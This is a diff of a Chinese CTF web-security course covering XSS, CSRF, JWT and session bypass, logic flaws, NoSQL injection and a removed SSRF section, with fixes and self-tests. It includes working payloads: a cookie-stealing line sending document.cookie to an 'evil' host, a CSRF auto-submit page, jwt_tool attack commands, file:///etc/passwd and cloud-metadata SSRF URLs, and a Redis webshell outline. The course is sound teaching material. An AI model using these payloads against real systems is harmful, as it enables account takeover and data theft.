-2. **它被送到了哪里**：数据库、文件系统、shell、模板引擎、反序列化函数、内网 HTTP 请求。这一步决定漏洞类型。
-3. **中间有没有过滤，过滤做在哪一层**：前端 JS（等于没有）、后端关键字替换（通常可绕）、WAF（看规则）、类型强转（最有效）。
+1. 选一个节点，先读「一句话 / 根因 / 怎么观察」，**不要急着背 payload**。
+2. 按节点给出的英文关键词，找 2 篇高质量文章（优先官方文档、PortSwigger、HackTricks）。
+3. 在本地靶场手动复现：先证明「数据被当成了什么」，再谈具体 payload。
+4. 写三行笔记：根因、修复点、换一个语言/框架是否还成立。
+5. 回到图谱，把相关节点连起来看（如 上传 → 包含 → RCE），理解漏洞链而不是单点。
 
-### 学习顺序（不要跳）
+### 三个必须做到的标准
 
-- **先会读源码**：同一个 payload 在 PHP / Python / Java 里长得完全不一样，读不懂源码就只能背题。
-- **再认漏洞**：能在一段代码里指认出「这行是注入点」，比记住 100 个 payload 有价值。
-- **然后练 payload**：把每一类的 3–5 个标准 payload 练到能默写。
-- **最后练思路**：真实题目不会告诉你「这是 SQL 注入」，要靠 PART 9 的决策树自己判断。
+- **能画出数据流**：输入从哪来 → 经过什么处理 → 落到哪个危险函数。
+- **能说出修复**：改哪一行、为什么能根治，而不是只加一个关键字过滤。
+- **能换环境**：PHP 的 SQLi 换成 Flask + SQLite 还成立吗？成立的部分才是原理。
+- **能连成链**：上传 → 包含 → RCE；SQLi → UDF → RCE；XSS → 读 Token → 绕过 CSRF。
 
-> 💡 分类不是为了考试，是为了**检索**：看到「输入进了数据库」就去翻 SQLi 那节；看到「要求输入 URL」就去翻 SSRF 那节。本 PART 的每一节都按同一个结构写：原理 → 判断 → 利用 → 修复。
+> 💡 会打不等于会。payload 是结果，**根因**才是可迁移的东西。你如果能解释「为什么这一行会产生漏洞」，修复和变体都是自然推导出来的；反过来，只会背 payload，换个框架就归零。
 
 
 ### 靶场与资源
 
+- [🕸 漏洞图谱（本页左侧入口）](#vulnmap)
 - [OWASP Top 10（2021）](https://owasp.org/www-project-top-ten/)
 
 
 ### 自测 · 答不上就回去重读
 
-1. 把 18 类漏洞按「被当成什么」分成 6 组，各写一个例子。
-2. 「文件上传」和「文件包含」为什么分在不同组？
-3. 为什么说「前端过滤等于没有过滤」？
-4. 拿到一道陌生题目，你会先看哪三样东西？
+1. 为什么不再按「基础 / 高级」给漏洞分类？
+2. 一个漏洞的「诞生地」由哪三件事决定？
+3. 为什么说「会打不等于会」？
+4. 挑一个节点，说出它的根因和修复点。
+5. 上传、文件包含、RCE 怎么接成一条链？
+
+---
+
+## XSS：反射、存储、DOM
+
+*约 45 分钟*
+
+> 🎯 **本节目标**：分清三类 XSS 的触发路径，能根据 payload 落点选择正确写法。
+
+XSS 的本质和 SQL 注入一模一样：**用户输入被当成 HTML/JS 代码，交给了浏览器执行。**区别在于执行的战场从数据库换成了浏览器——所以危害从「读数据」变成「以你的身份干任何事」。
+
+**三类对比**
+
+| 类型 | 数据路径 | 触发时机 | 典型场景 |
+| --- | --- | --- | --- |
+| 反射型 | 输入 → 服务器 → 立刻写回响应 → 浏览器执行 | 受害者点开构造好的链接 | 搜索结果页、错误提示回显参数 |
+| 存储型 | 输入 → 数据库 → 别人访问页面时取出执行 | 任何人打开页面就中招 | 留言板、昵称、评论、工单 |
+| DOM 型 | 输入 → 前端 JS 直接写进 DOM（不经过服务器） | 页面内 JS 处理 URL/hash 时 | document.write(location.hash)、innerHTML |
+
+三者的区别决定了「怎么验证」：反射型和存储型会在服务器响应里看到 payload，DOM 型往往看不到——因为 payload 从头到尾都在浏览器里流转，服务器日志里只有一段正常的 URL。
+
+### 先判断落点，再选 payload
+
+**上下文 → payload**
+
+| 落点位置 | payload 思路 | 示例 |
+| --- | --- | --- |
+| HTML 正文 | 直接插标签 | &lt;script&gt;alert(1)&lt;/script&gt;、&lt;img src=x onerror=alert(1)&gt; |
+| 属性值里（双引号） | 先闭合属性再插事件 | " onmouseover="alert(1) |
+| 属性值里（单引号） | 同上，换单引号 | ' onfocus='alert(1)' autofocus=' |
+| &lt;script&gt; 内部字符串 | 闭合 script 标签 | &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; |
+| href / src | 伪协议 | javascript:alert(1) |
+| CSS / style 里 | expression / 类 CSS 注入 | 看浏览器版本，现代浏览器基本堵死 |
+| JSON 回显 | 先看是否 text/html 渲染 | {"name":"&lt;img src=x onerror=alert(1)&gt;"} |
+
+**存储型最小复现（留言板）**
+
+```php
+<?php
+// 后端：把用户输入直接存库、直接输出
+$msg = $_POST['msg'];
+mysqli_query($conn, "INSERT INTO board(msg) VALUES('$msg')");
+
+// 页面渲染
+echo "<div class='msg'>" . $row['msg'] . "</div>";
+// 输入 <img src=x onerror=alert(document.cookie)>
+// 之后每个访问留言板的人都会执行它
+?>
+```
+
+**DOM 型最小复现**
+
+```js
+// 页面里写了这样一段（很常见）
+var name = location.hash.slice(1);
+document.getElementById("hello").innerHTML = "你好，" + name;
+
+// 访问：http://target/#<img src=x onerror=alert(1)>
+// 服务器完全没参与，日志里只有一条正常请求
+```
+
+### 拿到 XSS 之后能干什么
+
+- **偷 Cookie**：`new Image().src='http://evil/'+document.cookie`（HttpOnly 的 Cookie 读不到）。
+- **发请求**：以受害者身份调用任意接口，绕开 CSRF Token（因为脚本就在同源页面里）。
+- **改页面**：伪造登录框钓密码，或把转账按钮改成「领红包」。
+- **读 DOM**：页面里渲染出来的敏感信息、前端存的 token，全都能读走。
+
+### 修复：输出编码 + 纵深防御
+
+**按上下文转义**
+
+```php
+<?php
+// HTML 正文 / 属性：htmlspecialchars
+echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');
+
+// JS 字符串里：json_encode 而不是手拼引号
+echo "<script>var name = " . json_encode($msg) . ";</script>";
+
+// URL 里：urlencode
+echo "<a href='?q=" . urlencode($q) . "'>搜索</a>";
+?>
+```
+
+> 💡 三道防线缺一不可：**输出时按上下文编码**（根治）、**HttpOnly**（Cookie 偷不走）、**CSP**（就算漏了也执行不了内联脚本）。前端框架的 `innerHTML`、`dangerouslySetInnerHTML`、`v-html` 都是新雷区。
+
+
+### 靶场与资源
+
+- [XSS-Labs（1–20 关）](https://github.com/do0dl3/xss-labs)
+- [PortSwigger · XSS](https://portswigger.net/web-security/cross-site-scripting)
+
+
+### 自测 · 答不上就回去重读
+
+1. 存储型和反射型的最大区别是什么？为什么存储型危害更大？
+2. DOM 型 XSS 为什么在服务器日志里看不到 payload？
+3. payload 落在 &lt;script&gt; 内部的字符串里，和落在 HTML 正文里，写法有什么不同？
+4. HttpOnly 能防住 XSS 吗？它防住了什么？
+5. 写出 PHP 里按上下文转义的三种做法。
+
+---
+
+## CSRF：借你的手发请求
+
+*约 30 分钟*
+
+> 🎯 **本节目标**：理解「浏览器自动带 Cookie」为什么能变成攻击，以及 Token / SameSite / Origin 各自防住了什么。
+
+CSRF（跨站请求伪造）不偷你的 Cookie，也不读你的数据。它只做一件事：**让浏览器带着你的 Cookie，去发一个你没想发的请求。**因为 Cookie 是「按域名自动附带的」，浏览器不会问「这是不是你自己点的」。
+
+**最小 PoC（攻击者页面）**
+
+```html
+<!-- 受害者登录了 bank.com 后，访问攻击者页面即触发 -->
+<form action="https://bank.com/transfer" method="POST" id="f">
+  <input name="to" value="hacker">
+  <input name="amount" value="10000">
+</form>
+<script>document.getElementById('f').submit()</script>
+
+<!-- 页面看起来什么都没发生，请求已经带着受害者的 Cookie 发出去了 -->
+```
+
+**成立条件与防护手段**
+
+| 条件 / 手段 | 说明 |
+| --- | --- |
+| 前提 1 | 目标用 Cookie 维持身份（Session/Cookie 认证） |
+| 前提 2 | 敏感操作只校验「有没有登录」，没有额外凭证 |
+| CSRF Token | 每个表单带一次性随机令牌，攻击者跨站拿不到它 |
+| SameSite Cookie | Lax：跨站 POST 不带 Cookie；Strict：跨站一律不带 |
+| 校验 Origin/Referer | 请求来源不是自己站点就拒绝 |
+| 二次验证 | 转账/改密要求再输密码或验证码（最稳） |
+
+### 为什么 CSRF Token 能防住
+
+同源策略让攻击者的页面**读不到**目标站点的页面内容——包括页面里的 Token。所以攻击者能「让浏览器发请求」，但发不出「带正确 Token 的请求」。这就是 CSRF 防护的核心逻辑：**把「身份」和「本次操作」绑在一起。**
+
+**后端怎么校验 Token**
+
+```php
+<?php
+session_start();
+// 生成：只有本站页面能拿到这个值
+$token = bin2hex(random_bytes(16));
+$_SESSION['csrf'] = $token;
+// 页面：<input type="hidden" name="csrf" value="<?= $token ?>">
+
+// 校验：POST 上来的 token 必须和 session 里的一致
+if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
+    die("CSRF token 校验失败");
+}
+?>
+```
+
+**常见变体**
+
+```html
+GET 型：<img src="https://bank.com/transfer?to=hacker&amount=10000">
+  -> 说明敏感操作绝不能用 GET
+
+JSON 型：需要用表单发 application/json 通常不行，
+  但目标若接收 text/plain 或 x-www-form-urlencoded 的 JSON，就能打
+
+配合 XSS：XSS 能读页面里的 Token，CSRF 防护直接失效
+  -> 所以 XSS 比 CSRF 危险得多
+```
+
+> 💡 CTF 里 CSRF 题常考「让你构造一个 PoC 页面并提交给 bot 访问」。要点：**表单自动提交、目标站点的 Cookie 要被带上、别用 fetch（会被 CORS 拦）**。
+
+
+### 靶场与资源
+
+- [PortSwigger · CSRF](https://portswigger.net/web-security/csrf)
+- [PortSwigger · SameSite 与 CSRF](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
+
+
+### 自测 · 答不上就回去重读
+
+1. CSRF 为什么不需要知道受害者的 Cookie？
+2. SameSite=Lax 能防住哪类 CSRF，防不住哪类？
+3. 有了 XSS 之后 CSRF Token 还有用吗？为什么？
+4. 为什么敏感操作不能用 GET？
+5. 写出一个最小 CSRF PoC 页面的结构。
+
+---
+
+## 认证绕过：Session / JWT / Cookie
+
+*约 35 分钟*
+
+> 🎯 **本节目标**：掌握三类「冒充身份」的常用手法，并能用工具验证。
+
+认证绕过是 CTF 里性价比最高的一类：不用拿 shell，改一个字段就能进后台。
+
+**JWT 的四类攻击**
+
+```
+1. alg 改成 none，删掉签名段
+   {"alg":"none"} . payload . （空签名）
+   -> 服务器若没显式拒绝 none，直接通过
+
+2. 弱密钥爆破
+   用 jwt_tool / hashcat，字典来自常见弱口令
+
+3. 算法混淆（RS256 -> HS256）
+   前提：服务器用公钥验证，但代码里把公钥当 HS256 的密钥用
+   -> 用公钥当 HMAC 密钥重新签名
+
+4. kid 注入
+   kid 指向可控文件（../dev/null）或直接拼进 SQL
+   -> 用空密钥 / 用已知文件内容当密钥
+```
+
+**jwt_tool 常用命令**
+
+```bash
+python3 jwt_tool.py <JWT> -M at            # 自动跑各种攻击
+python3 jwt_tool.py <JWT> -C -d wordlist.txt # 爆破 HS256 密钥
+python3 jwt_tool.py <JWT> -X a             # alg=none
+python3 jwt_tool.py <JWT> -X k -pk public.pem  # 算法混淆
+```
+
+**Session / Cookie 攻击面**
+
+| 手法 | 说明 |
+| --- | --- |
+| session id 可预测 | 时间戳、自增值、MD5(用户名) 之类 |
+| 伪造 Cookie 里的权限字段 | role=admin、is_admin=1，后端直接信任 |
+| Session Fixation | 让受害者用攻击者已知的 session id 登录 |
+| Cookie 里是序列化数据 | PHP/Java 反序列化入口 |
+| JWT 放在 localStorage | XSS 可直接读走 |
+
+### 判断顺序（按成本从低到高）
+
+1. 先看 token 结构：JWT 就 base64 解开 header/payload，看 role 之类的字段。
+2. 改 payload 里的权限字段，看签名是否被校验（不校验直接过 = 最简单）。
+3. 查 alg 是否接受 none，用 jwt_tool -X a 试。
+4. 用常见弱口令爆破 HS256 密钥。
+5. 看 kid/x5u/jku 等字段是否可控。
+6. 以上都不行，再考虑 session 伪造或反序列化。
+
+**JWT 结构（自己拆一遍）**
+
+```python
+import base64, json
+tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJ1c2VyIn0.xxxxx"
+h, p, s = tok.split(".")
+pad = lambda x: x + "=" * (-len(x) % 4)
+print(json.loads(base64.urlsafe_b64decode(pad(h))))
+print(json.loads(base64.urlsafe_b64decode(pad(p))))
+# 输出：{'alg': 'HS256', 'typ': 'JWT'}  {'uid': 1, 'role': 'user'}
+# 注意：payload 是"明文"，只是 base64，不是加密
+```
+
+> 💡 记住一个底层事实：**JWT 的安全性 100% 依赖签名校验**。payload 谁都能看、谁都能改。所有攻击最终都是「让服务器接受一个我没签过的 payload」。
+
+
+### 靶场与资源
+
+- [PortSwigger · JWT](https://portswigger.net/web-security/jwt)
+- [jwt_tool](https://github.com/ticarpi/jwt_tool)
+
+
+### 自测 · 答不上就回去重读
+
+1. alg=none 为什么能绕过验证？服务器该怎么防？
+2. RS256 混淆攻击的前提是什么？
+3. 为什么 session id 必须足够随机？
+4. kid 字段能怎么被利用？
+5. JWT 的 payload 是加密的吗？
+
+---
+
+## 逻辑漏洞与越权
+
+*约 30 分钟*
+
+> 🎯 **本节目标**：理解「代码没写错，但业务逻辑被绕过」，建立挖逻辑漏洞的固定流程。
+
+逻辑漏洞没有「注入点」这种明确标志，它的定义是：**功能按设计跑起来了，但某个假设被攻击者破坏了**——比如「用户只会改自己的 id」「金额只能是正数」「支付必须先付款」。
+
+**常见类型**
+
+| 类型 | 具体表现 | 怎么试 |
+| --- | --- | --- |
+| 水平越权 | 改 id 看别人的订单/资料 | 把用户 id 改成相邻值 |
+| 垂直越权 | 普通用户直接调管理员接口 | 抓管理员的请求，换成普通账号重放 |
+| 价格篡改 | 改单价、数量为负、优惠券叠加 | 改请求体里的金额字段 |
+| 支付绕过 | 跳过支付步骤、改金额、重放 | 删掉中间步骤直接请求最后一步 |
+| 验证码问题 | 复用、爆破、短信轰炸、前端校验 | 同一验证码用两次；写成 0000–9999 爆破 |
+| 流程竞争 | 同一优惠券并发使用多次 | 多线程同时发请求 |
+
+### 挖逻辑漏洞的四步
+
+1. 正常走一遍完整流程，用 Burp 记下**每一个**请求（注册、登录、下单、支付、退款）。
+2. 逐个问：这一步的「前提」是服务器保证的，还是前端/上一步保证的？
+3. 改掉你觉得「不该被改」的参数：id、数量、金额、状态、时间、角色。
+4. 重复、并发、乱序地发请求——很多漏洞只在「同时发生」时出现。
+
+**一个典型的越权**
+
+```
+# 正常：GET /api/order?id=1001      （当前用户自己的订单）
+# 越权：GET /api/order?id=1002      （别人的订单，服务器没校验归属）
+
+# 修复：从 session 里取用户 id，而不是从请求里取
+# 错误：SELECT * FROM orders WHERE id = $_GET['id']
+# 正确：SELECT * FROM orders WHERE id = ? AND user_id = ?
+```
+
+**并发竞争的最小验证**
+
+```bash
+# 用同一张优惠券同时发 20 个请求，看是否都被接受
+seq 20 | xargs -P 20 -I{} curl -s -b "session=..." \
+  -X POST https://target/api/coupon/use -d "code=XXXX" -o /dev/null -w "%{http_code}\n"
+
+# 原理：后端顺序是「查是否已用 -> 用掉 -> 更新状态」
+# 并发时多个请求在「查」之后、更新之前都通过了检查
+```
+
+> 💡 逻辑漏洞无法靠字典扫，全靠对业务流程的理解。**这类题最考耐心和观察力，也最接近真实的渗透测试**——因为它是真正「读懂系统」的体现。
+
+
+### 自测 · 答不上就回去重读
+
+1. 水平越权和垂直越权的区别？
+2. 「前端隐藏了按钮」为什么不算权限控制？
+3. 并发竞争利用的是什么缺陷？
+4. 挖逻辑漏洞的第一步是什么？
+5. 越权漏洞在代码层应该怎么修？
 
 ---
 
@@ -3323,104 +3771,69 @@ sqlmap -r req.txt -p id --batch --level 3 --risk 2
 
 ---
 
-## XSS：反射、存储、DOM
+## NoSQL 注入
 
-*约 45 分钟*
+*约 25 分钟*
 
-> 🎯 **本节目标**：分清三类 XSS 的触发路径，能根据 payload 落点选择正确写法。
+> 🎯 **本节目标**：理解 MongoDB 查询对象的注入方式，以及和 SQL 注入的共同点。
 
-XSS 的本质和 SQL 注入一模一样：**用户输入被当成 HTML/JS 代码，交给了浏览器执行。**区别在于执行的战场从数据库换成了浏览器——所以危害从「读数据」变成「以你的身份干任何事」。
+NoSQL 数据库（MongoDB 最常见）用「对象」来描述查询条件。如果后端把用户输入直接拼进查询对象，攻击者就能构造出「匹配任意值」的条件——这和 SQL 注入同源，只是注入的载体从字符串换成了对象。
 
-**三类对比**
-
-| 类型 | 数据路径 | 触发时机 | 典型场景 |
-| --- | --- | --- | --- |
-| 反射型 | 输入 → 服务器 → 立刻写回响应 → 浏览器执行 | 受害者点开构造好的链接 | 搜索结果页、错误提示回显参数 |
-| 存储型 | 输入 → 数据库 → 别人访问页面时取出执行 | 任何人打开页面就中招 | 留言板、昵称、评论、工单 |
-| DOM 型 | 输入 → 前端 JS 直接写进 DOM（不经过服务器） | 页面内 JS 处理 URL/hash 时 | document.write(location.hash)、innerHTML |
-
-三者的区别决定了「怎么验证」：反射型和存储型会在服务器响应里看到 payload，DOM 型往往看不到——因为 payload 从头到尾都在浏览器里流转，服务器日志里只有一段正常的 URL。
-
-### 先判断落点，再选 payload
-
-**上下文 → payload**
-
-| 落点位置 | payload 思路 | 示例 |
-| --- | --- | --- |
-| HTML 正文 | 直接插标签 | &lt;script&gt;alert(1)&lt;/script&gt;、&lt;img src=x onerror=alert(1)&gt; |
-| 属性值里（双引号） | 先闭合属性再插事件 | " onmouseover="alert(1) |
-| 属性值里（单引号） | 同上，换单引号 | ' onfocus='alert(1)' autofocus=' |
-| &lt;script&gt; 内部字符串 | 闭合 script 标签 | &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; |
-| href / src | 伪协议 | javascript:alert(1) |
-| CSS / style 里 | expression / 类 CSS 注入 | 看浏览器版本，现代浏览器基本堵死 |
-| JSON 回显 | 先看是否 text/html 渲染 | {"name":"&lt;img src=x onerror=alert(1)&gt;"} |
-
-**存储型最小复现（留言板）**
-
-```php
-<?php
-// 后端：把用户输入直接存库、直接输出
-$msg = $_POST['msg'];
-mysqli_query($conn, "INSERT INTO board(msg) VALUES('$msg')");
-
-// 页面渲染
-echo "<div class='msg'>" . $row['msg'] . "</div>";
-// 输入 <img src=x onerror=alert(document.cookie)>
-// 之后每个访问留言板的人都会执行它
-?>
-```
-
-**DOM 型最小复现**
+**MongoDB 注入原理**
 
 ```js
-// 页面里写了这样一段（很常见）
-var name = location.hash.slice(1);
-document.getElementById("hello").innerHTML = "你好，" + name;
+// 正常查询
+db.users.find({ username: name, password: pw })
 
-// 访问：http://target/#<img src=x onerror=alert(1)>
-// 服务器完全没参与，日志里只有一条正常请求
+// 攻击：让 password 变成「不等于 1」的查询对象
+// 请求：?username=admin&password[$ne]=1
+// 后端解析成 { username: 'admin', password: { $ne: 1 } }
+// -> 只要密码不等于 1 就匹配，等于绕过密码校验
+
+// 其他常用操作符
+?username[$regex]=^adm&password[$ne]=1
+?username[$gt]=&password[$gt]=
 ```
 
-### 拿到 XSS 之后能干什么
+**常用操作符与含义**
 
-- **偷 Cookie**：`new Image().src='http://evil/'+document.cookie`（HttpOnly 的 Cookie 读不到）。
-- **发请求**：以受害者身份调用任意接口，绕开 CSRF Token（因为脚本就在同源页面里）。
-- **改页面**：伪造登录框钓密码，或把转账按钮改成「领红包」。
-- **读 DOM**：页面里渲染出来的敏感信息、前端存的 token，全都能读走。
+| 操作符 | 含义 | 注入用法 |
+| --- | --- | --- |
+| $ne | 不等于 | $ne=1 让密码校验永远为真 |
+| $gt / $lt | 大于 / 小于 | $gt= 空串匹配任何存在的值 |
+| $regex | 正则匹配 | 逐字符猜用户名/密码 |
+| $exists | 字段存在 | 探测字段 |
+| $where | JS 表达式（旧版） | 直接执行 JS，危害最大 |
 
-### 修复：输出编码 + 纵深防御
+**后端漏洞代码与修复**
 
-**按上下文转义**
+```js
+// 危险：直接把 req.body 当年的查询条件
+app.post('/login', (req, res) => {
+  db.collection('users').findOne({ username: req.body.username, password: req.body.password })
+    .then(u => res.send(u ? 'ok' : 'fail'));
+});
 
-```php
-<?php
-// HTML 正文 / 属性：htmlspecialchars
-echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');
-
-// JS 字符串里：json_encode 而不是手拼引号
-echo "<script>var name = " . json_encode($msg) . ";</script>";
-
-// URL 里：urlencode
-echo "<a href='?q=" . urlencode($q) . "'>搜索</a>";
-?>
+// 修复 1：强制把参数转成字符串
+const username = String(req.body.username);
+// 修复 2：用 express-mongo-sanitize 去掉 $ 开头的键
+// 修复 3：密码比对在应用层做（hash 比对），不要拼进查询条件
 ```
 
-> 💡 三道防线缺一不可：**输出时按上下文编码**（根治）、**HttpOnly**（Cookie 偷不走）、**CSP**（就算漏了也执行不了内联脚本）。前端框架的 `innerHTML`、`dangerouslySetInnerHTML`、`v-html` 都是新雷区。
+> 💡 CTF 里 NoSQL 注入的入口通常是登录框；用 `[$ne]=1` 或 `[$regex]` 试一下就知道。判据和 SQL 盲注一样：**看响应差异**。
 
 
 ### 靶场与资源
 
-- [XSS-Labs（1–20 关）](https://github.com/do0dl3/xss-labs)
-- [PortSwigger · XSS](https://portswigger.net/web-security/cross-site-scripting)
+- [PortSwigger · NoSQL injection](https://portswigger.net/web-security/nosql-injection)
 
 
 ### 自测 · 答不上就回去重读
 
-1. 存储型和反射型的最大区别是什么？为什么存储型危害更大？
-2. DOM 型 XSS 为什么在服务器日志里看不到 payload？
-3. payload 落在 &lt;script&gt; 内部的字符串里，和落在 HTML 正文里，写法有什么不同？
-4. HttpOnly 能防住 XSS 吗？它防住了什么？
-5. 写出 PHP 里按上下文转义的三种做法。
+1. $ne 在 MongoDB 里是什么语义？
+2. 为什么 ?password[$ne]=1 会被解析成对象？
+3. NoSQL 注入和 SQL 注入共同的根源是什么？
+4. 怎么防御 NoSQL 注入？
 
 ---
 
@@ -3673,201 +4086,6 @@ system("ping -c 1 " . escapeshellarg($ip));
 
 ---
 
-## SSRF：让服务器替你访问
-
-*约 40 分钟*
-
-> 🎯 **本节目标**：理解 SSRF 的三种用途（内网探测、读文件、打内网应用），掌握常见过滤的绕过。
-
-SSRF（Server-Side Request Forgery）的本质：**服务器会去访问你给的地址，而你给了一个它本不该访问的地址。**它的价值在于「绕过防火墙」——你从外网连不进去的内网服务，服务器能连。
-
-**典型漏洞代码**
-
-```php
-<?php
-// 功能：图片加载 / URL 预览 / 远程下载
-$url = $_GET['url'];
-echo file_get_contents($url);
-
-// 正常：?url=https://example.com/a.png
-// 攻击：?url=http://127.0.0.1/admin          （访问本机管理后台）
-// 攻击：?url=file:///etc/passwd               （读本地文件）
-// 攻击：?url=http://169.254.169.254/latest/meta-data/   （云元数据）
-?>
-```
-
-**协议与用途**
-
-| 协议 | 用途 | 说明 |
-| --- | --- | --- |
-| http / https | 打内网 Web 服务 | 最常见 |
-| file:// | 读本地文件 | PHP 默认允许 |
-| dict:// | 探测端口、打 Redis/Memcached | dict://127.0.0.1:6379/info |
-| gopher:// | 构造任意 TCP 报文（打 Redis、MySQL、FastCGI） | 能发原始字节，利用面最广 |
-| ftp:// / tftp:// | 探测内网文件服务 | 有时可用 |
-
-### 判断 SSRF 是否存在
-
-1. 找一个「服务器会访问 URL」的功能：图片加载、URL 预览、webhook、远程下载、PDF 生成。
-2. 喂一个自己控制的地址（或 dnslog.cn），看服务器有没有回连——有回连就是 SSRF。
-3. 试 `http://127.0.0.1:端口` 扫内网端口：响应时间/内容不同就是服务存活。
-4. 试 `file:///etc/passwd` 读文件；试 `http://169.254.169.254/` 读云元数据。
-5. 拿到 Redis / MySQL 之类内网服务时，用 gopher 构造报文打（这一层属于进阶）。
-
-**gopher 打 Redis 的思路**
-
-```bash
-# Redis 未授权：直接写 webshell 或写 crontab
-# gopher 报文体需要把命令转成 Redis 协议（RESP）再做 URL 编码
-# 常用工具：Gopherus、SSRFmap
-
-# 简化示意：gopher://127.0.0.1:6379/_<URL编码后的RESP>
-# 关键命令序列：CONFIG SET dir /var/www/html -> CONFIG SET dbfilename 1.php -> SET x "<?php ...?>" -> SAVE
-```
-
-**常见过滤与绕过**
-
-| 过滤方式 | 绕过写法 |
-| --- | --- |
-| 过滤 127.0.0.1 | 127.1、0.0.0.0、[::1]、2130706433、0x7f000001、127.0.0.1.nip.io |
-| 过滤 localhost | 同上，或 DNS 重绑定（第一次解析公网 IP 过校验，第二次解析内网） |
-| 只允许 http:// | 302 跳转绕过：自己的服务器跳回内网地址 |
-| 校验 URL 前缀 | user@host 形式：http://expected.com@evil.com/ |
-| 校验 host 但没校验端口 | 直接换端口找内网服务 |
-| 禁 file 协议 | 用 gopher / dict 曲线读文件或打服务（取决于库） |
-
-**修复：白名单 + 解析后校验**
-
-```php
-<?php
-// 1. 只允许明确需要的协议
-$scheme = parse_url($url, PHP_URL_SCHEME);
-if (!in_array($scheme, ['http', 'https'])) die("协议不允许");
-
-// 2. 解析域名成 IP，再判断是不是内网地址
-$host = parse_url($url, PHP_URL_HOST);
-$ip = gethostbyname($host);
-if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
-    die("内网地址不允许");
-}
-
-// 3. 禁止跟随跳转（curl: CURLOPT_FOLLOWLOCATION => false）
-// 4. 出站流量走统一代理，在代理层做白名单
-?>
-```
-
-> 💡 SSRF 的修复比利用更难：因为「解析」和「连接」之间有时间差（DNS 重绑定就利用这一点）。生产上最可靠的做法是**出站白名单代理**，而不是在代码里做黑名单过滤。
-
-
-### 靶场与资源
-
-- [PortSwigger · SSRF](https://portswigger.net/web-security/ssrf)
-- [CTFHub · SSRF 专项](https://www.ctfhub.com/)
-
-
-### 自测 · 答不上就回去重读
-
-1. SSRF 为什么能绕过防火墙？
-2. 169.254.169.254 是什么地址？拿到它能干什么？
-3. DNS 重绑定怎么绕过「只允许公网 IP」的校验？
-4. 为什么说 SSRF 的修复比利用更难？
-5. 写出两种绕过 127.0.0.1 过滤的写法。
-
----
-
-# PART 8 · 高级漏洞
-
-*第 15–18 周 · 9 节*
-
-> 需要更多前置知识的漏洞：CSRF、模板注入、XML、反序列化、认证绕过、逻辑漏洞、NoSQL、原型链污染。全部要学，学到这里你已经开始「读源码找链」而不是「背 payload」。
-
----
-
-## CSRF：借你的手发请求
-
-*约 30 分钟*
-
-> 🎯 **本节目标**：理解「浏览器自动带 Cookie」为什么能变成攻击，以及 Token / SameSite / Origin 各自防住了什么。
-
-CSRF（跨站请求伪造）不偷你的 Cookie，也不读你的数据。它只做一件事：**让浏览器带着你的 Cookie，去发一个你没想发的请求。**因为 Cookie 是「按域名自动附带的」，浏览器不会问「这是不是你自己点的」。
-
-**最小 PoC（攻击者页面）**
-
-```html
-<!-- 受害者登录了 bank.com 后，访问攻击者页面即触发 -->
-<form action="https://bank.com/transfer" method="POST" id="f">
-  <input name="to" value="hacker">
-  <input name="amount" value="10000">
-</form>
-<script>document.getElementById('f').submit()</script>
-
-<!-- 页面看起来什么都没发生，请求已经带着受害者的 Cookie 发出去了 -->
-```
-
-**成立条件与防护手段**
-
-| 条件 / 手段 | 说明 |
-| --- | --- |
-| 前提 1 | 目标用 Cookie 维持身份（Session/Cookie 认证） |
-| 前提 2 | 敏感操作只校验「有没有登录」，没有额外凭证 |
-| CSRF Token | 每个表单带一次性随机令牌，攻击者跨站拿不到它 |
-| SameSite Cookie | Lax：跨站 POST 不带 Cookie；Strict：跨站一律不带 |
-| 校验 Origin/Referer | 请求来源不是自己站点就拒绝 |
-| 二次验证 | 转账/改密要求再输密码或验证码（最稳） |
-
-### 为什么 CSRF Token 能防住
-
-同源策略让攻击者的页面**读不到**目标站点的页面内容——包括页面里的 Token。所以攻击者能「让浏览器发请求」，但发不出「带正确 Token 的请求」。这就是 CSRF 防护的核心逻辑：**把「身份」和「本次操作」绑在一起。**
-
-**后端怎么校验 Token**
-
-```php
-<?php
-session_start();
-// 生成：只有本站页面能拿到这个值
-$token = bin2hex(random_bytes(16));
-$_SESSION['csrf'] = $token;
-// 页面：<input type="hidden" name="csrf" value="<?= $token ?>">
-
-// 校验：POST 上来的 token 必须和 session 里的一致
-if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
-    die("CSRF token 校验失败");
-}
-?>
-```
-
-**常见变体**
-
-```html
-GET 型：<img src="https://bank.com/transfer?to=hacker&amount=10000">
-  -> 说明敏感操作绝不能用 GET
-
-JSON 型：需要用表单发 application/json 通常不行，
-  但目标若接收 text/plain 或 x-www-form-urlencoded 的 JSON，就能打
-
-配合 XSS：XSS 能读页面里的 Token，CSRF 防护直接失效
-  -> 所以 XSS 比 CSRF 危险得多
-```
-
-> 💡 CTF 里 CSRF 题常考「让你构造一个 PoC 页面并提交给 bot 访问」。要点：**表单自动提交、目标站点的 Cookie 要被带上、别用 fetch（会被 CORS 拦）**。
-
-
-### 靶场与资源
-
-- [PortSwigger · CSRF](https://portswigger.net/web-security/csrf)
-- [PortSwigger · SameSite 与 CSRF](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
-
-
-### 自测 · 答不上就回去重读
-
-1. CSRF 为什么不需要知道受害者的 Cookie？
-2. SameSite=Lax 能防住哪类 CSRF，防不住哪类？
-3. 有了 XSS 之后 CSRF Token 还有用吗？为什么？
-4. 为什么敏感操作不能用 GET？
-5. 写出一个最小 CSRF PoC 页面的结构。
-
----
-
 ## SSTI：模板注入
 
 *约 35 分钟*
@@ -4038,7 +4256,7 @@ XML 允许在 DOCTYPE 里定义「实体」，实体的值可以是一个外部 
 
 ---
 
-## 反序列化（PHP）
+## 反序列化（PHP）：魔术方法与 pop 链
 
 *约 40 分钟*
 
@@ -4137,7 +4355,94 @@ echo serialize($payload);
 
 ---
 
-## 反序列化（Java）与组件漏洞
+## 反序列化（Python）：pickle 与对象图
+
+*约 35 分钟*
+
